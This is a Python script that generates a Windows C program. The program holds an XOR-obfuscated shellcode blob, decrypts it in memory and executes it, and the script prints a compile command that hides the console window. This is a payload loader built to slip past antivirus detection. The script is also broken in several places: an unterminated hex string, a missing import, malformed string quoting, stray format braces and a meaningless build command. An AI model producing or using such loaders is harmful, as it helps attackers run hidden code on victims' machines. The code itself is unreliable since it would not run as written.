def create_encrypted_shellcode_c_file(filename):
    shellcode_hex = 'B0FEB585C148224DA08400995090CD29C148020848C0E800AD8992C148500F8489080008484884894894CD28948C1480488484884894CD09889F089588B75FFEB05B8004889E04889E7C148224DA096CD08958B8C2405458220848C1482008488B0088E84889E04889E7C1485008480590F8C6A0045448AD8C1480488484884894CD000089C0EBFFB00090CD4090CD307C90E84D39508400CD9C148249084748848C0008CD98B008348498CD8484808B75FC894C2488CD837D018B75FFEB04908910C74800084948AD8C1480488484884894CD40CD0C14824908444800CD98B008348498CD8484808B75FC894C2488CD837D018B75FFFFFFEB04908910C74800084948AD8C14844800CD909090CD409090CD30CD18B008C2488CD930B130B240EED83FF6D2B257FC0CD9748C14820488485288464608830D85F7784F325B13400000086C77204E7871FECD059000006C77204A4501F7E)
    # XOR key
    xor_key = 0x64

    # XOR encryption
    encrypted_shellcode = ''.join(chr(ord(char) ^ xor_key) for char in binascii.unhexlify(shellcode_hex))

    # Generate the C code with encrypted shellcode and decryption logic
    c_code = """#include <windows.h>
#include <stdio.h>

unsigned char code[] = """" + encrypted_shellcode + """";
unsigned int code_len = sizeof(code)-1;

int main() {{
    unsigned int i;
    unsigned char xor_key = 0x""" + hex(xor_key)[2:] + """;
    
    // XOR decryption
    for(i = 0; i < code_len; i++) {{
        code[i] ^= xor_key;
    }}
    
    typedef void (*shellcode)();

    shellcode myshellcode = (shellcode)code;
    myshellcode();
    
    return 0;
}}
"""

    # Write the C code to a file
    with open(filename, "w") as c_file:
        c_file.write(c_code)
    
    # Compile command
    compile_command = "mingw32-make -f - -o {output_filename} CFLAGS=\"-O2 -s -Wall -fno-stack-protector -mwindows\" \\\nLDFLAGS=\"-static -s\" \".c\"\n\t\t\t@echo \"Compiled executable: {output_filename}\" && strip {output_filename}".format(output_filename=filename.replace('.c', ''))

    print("C code written to:", filename)
    print("To compile this code, run:", compile_command)

# Example usage
create_encrypted_shellcode_c_file("encrypted_shellcode.c")